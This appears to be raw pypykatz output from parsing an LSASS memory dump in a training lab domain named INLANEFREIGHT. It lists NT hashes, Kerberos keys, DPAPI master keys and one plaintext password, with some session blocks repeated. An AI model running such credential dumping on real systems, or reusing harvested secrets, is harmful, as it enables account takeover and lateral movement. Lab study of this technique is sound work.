> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 1929996 (1d730c)
> session_id 2
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T09:44:35.478184+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 1929996
> 	== MSV ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 		LM: NA
> 		NT: 2831bf1e4e0841d882328d5481fb5c92
> 		SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d730c]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 	== WDIGEST [1d730c]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 1908867 (1d2083)
> session_id 2
> username DWM-2
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T09:44:33.696924+00:00
> sid S-1-5-90-0-2
> luid 1908867
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d2083]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d2083]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 997 (3e5)
> session_id 0
> username LOCAL SERVICE
> domainname NT AUTHORITY
> logon_server 
> logon_time 2026-09-10T08:49:59.056504+00:00
> sid S-1-5-19
> luid 997
> 	== Kerberos ==
> 		Username: 
> 		Domain: 
> 
> == LogonSession ==
> authentication_id 73994 (1210a)
> session_id 1
> username DWM-1
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T08:49:58.884433+00:00
> sid S-1-5-90-0-1
> luid 73994
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1210a]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1210a]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 44307 (ad13)
> session_id 1
> username UMFD-1
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T08:49:58.259418+00:00
> sid S-1-5-96-0-1
> luid 44307
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [ad13]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [ad13]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 44248 (acd8)
> session_id 0
> username UMFD-0
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T08:49:58.259418+00:00
> sid S-1-5-96-0-0
> luid 44248
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [acd8]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [acd8]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> pypykatz lsa minidump lsass.DMP
> INFO:pypykatz:Parsing file lsass.DMP
> FILE: ======== lsass.DMP =======
> == LogonSession ==
> authentication_id 2380578 (245322)
> session_id 0
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T10:04:33.214773+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 2380578
> 
> == LogonSession ==
> authentication_id 1930025 (1d7329)
> session_id 2
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T09:44:35.493927+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 1930025
> 	== MSV ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 		LM: NA
> 		NT: 2831bf1e4e0841d882328d5481fb5c92
> 		SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d7329]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 	== WDIGEST [1d7329]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== DPAPI [1d7329]==
> 		luid 1930025
> 		key_guid c1afa94a-cfe7-44f9-8221-84844b1177fa
> 		masterkey f7d44d8c674ddb5167664854edc2897e2f14a7a5ac8686889f516134c518be52b1131b6d0d23e3d8fa595aae4d956db9e2a8b9578b735abe2e2d9f1c737f63a5
> 		sha1_masterkey 4d2ec20d809ffb312df4eba4d8fa4e13ede156b6
> 
> == LogonSession ==
> authentication_id 1907824 (1d1c70)
> session_id 2
> username UMFD-2
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T09:44:33.650082+00:00
> sid S-1-5-96-0-2
> luid 1907824
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d1c70]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d1c70]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 43101 (a85d)
> session_id 0
> username 
> domainname 
> logon_server 
> logon_time 2026-09-10T08:49:57.728312+00:00
> sid None
> luid 43101
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 
> == LogonSession ==
> authentication_id 1908901 (1d20a5)
> session_id 2
> username DWM-2
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T09:44:33.696924+00:00
> sid S-1-5-90-0-2
> luid 1908901
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d20a5]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d20a5]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 74012 (1211c)
> session_id 1
> username DWM-1
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T08:49:58.884433+00:00
> sid S-1-5-90-0-1
> luid 74012
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1211c]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1211c]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 999 (3e7)
> session_id 0
> username PIVOT-SRV01$
> domainname INLANEFREIGHT
> logon_server 
> logon_time 2026-09-10T08:49:57.540704+00:00
> sid S-1-5-18
> luid 999
> 	== WDIGEST [3e7]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: pivot-srv01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: fca24755cf2d5cc1fb8243fce649b50d03e3c2a6ea207d73578166cb3a65dc9a
> 	== WDIGEST [3e7]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 6f898230-c272-4f85-875c-9f7b354ce485
> 		masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
> 		sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6
> 		masterkey eca925284a52906e2fd6cc17fc32eb00147ee9658930c82de6903034e2ba338fa259e096ced51569555490d1dc5903f1b2e9bbd87996b5e95c81b5c1bad0c28c
> 		sha1_masterkey 785e6d5a1dc4a77a4b963b4198b2b5754000a6ef
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid ea556f9f-b1ec-4d0e-934e-56f7b1a4521e
> 		masterkey 3dc6e360071199eb6016523b2a1de43ab2d413d2bedae3518fb97b4f1d300a9bbb9fcde111169ba57d2ae87be2ee108a60ec7aaa34f9d1af06dff18abc6aaf99
> 		sha1_masterkey 22310fb283beb13eadea78129b5b911380a6d522
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid b3862c68-c7e9-4bc0-8b69-6b6433fc3bd1
> 		masterkey 9566cb007639238cfefff46df2e3991d7024311316b3fa0555de19aca824c9e73ab8f3a5d948c419e7424be810ca0a4afd0d70fac9cc470878b3a37931c4bdb7
> 		sha1_masterkey d49aa73fffee65939ecd4b116f96a5294be4c2f2
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 3c982846-6a2a-4010-b51b-669ec5db81f0
> 		masterkey 9c63585287dc316023e3faacf5e5ab60a173e438bca700ae1fef4960eee9c6177293d75539db21318ae10ea607564e505bad97170b3da360273e238e54abaab4
> 		sha1_masterkey 0217906e3c34978813634d6b50dfbf318f047e3e
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid e515d917-4aa5-4953-a6ca-428d211c999c
> 		masterkey ae42b1ffb36e3b9a896bc9a1fd85eafc14ac34104c14cc8fb38311cb4276429707075234ec35888d241e8c77019d67955662af1cf91777c44e7a47e211477c9d
> 		sha1_masterkey e4fdff41feae03471f1850c0ab485246aa632417
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
> 		masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
> 		sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1
> 
> == LogonSession ==
> authentication_id 162969 (27c99)
> session_id 0
> username vfrank
> domainname INLANEFREIGHT
> logon_server ACADEMY-PIVOT-D
> logon_time 2026-09-10T08:50:25.446935+00:00
> sid S-1-5-21-3858284412-1730064152-742000644-1103
> luid 162969
> 	== MSV ==
> 		Username: vfrank
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 2e16a00be74fa0bf862b4256d0347e83
> 		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
> 		DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
> 	== WDIGEST [27c99]==
> 		username vfrank
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: vfrank
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: Imply wet Unmasked!
> 		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
> 		AES128 Key: 2e16a00be74fa0bf862b4256d0347e83
> 		AES256 Key: 0f09825ef5dccf80429d92f8d8c3d4eae29b3f01d95e805e97fe1ca5b81c87e8
> 	== WDIGEST [27c99]==
> 		username vfrank
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== DPAPI [27c99]==
> 		luid 162969
> 		key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
> 		masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
> 		sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
> 
> == LogonSession ==
> authentication_id 996 (3e4)
> session_id 0
> username PIVOT-SRV01$
> domainname INLANEFREIGHT
> logon_server 
> logon_time 2026-09-10T08:49:58.493791+00:00
> sid S-1-5-20
> luid 996
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [3e4]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: pivot-srv01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: fca24755cf2d5cc1fb8243fce649b50d03e3c2a6ea207d73578166cb3a65dc9a
> 	== WDIGEST [3e4]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 1929996 (1d730c)
> session_id 2
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T09:44:35.478184+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 1929996
> 	== MSV ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 		LM: NA
> 		NT: 2831bf1e4e0841d882328d5481fb5c92
> 		SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d730c]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 	== WDIGEST [1d730c]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 1908867 (1d2083)
> session_id 2
> username DWM-2
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T09:44:33.696924+00:00
> sid S-1-5-90-0-2
> luid 1908867
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d2083]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d2083]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 997 (3e5)
> session_id 0
> username LOCAL SERVICE
> domainname NT AUTHORITY
> logon_server 
> logon_time 2026-09-10T08:49:59.056504+00:00
> sid S-1-5-19
> luid 997
> 	== Kerberos ==
> 		Username: 
> 		Domain: 
> 
> == LogonSession ==
> authentication_id 73994 (1210a)
> session_id 1
> username DWM-1
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T08:49:58.884433+00:00
> sid S-1-5-90-0-1
> luid 73994
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1210a]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1210a]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 44307 (ad13)
> session_id 1
> username UMFD-1
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T08:49:58.259418+00:00
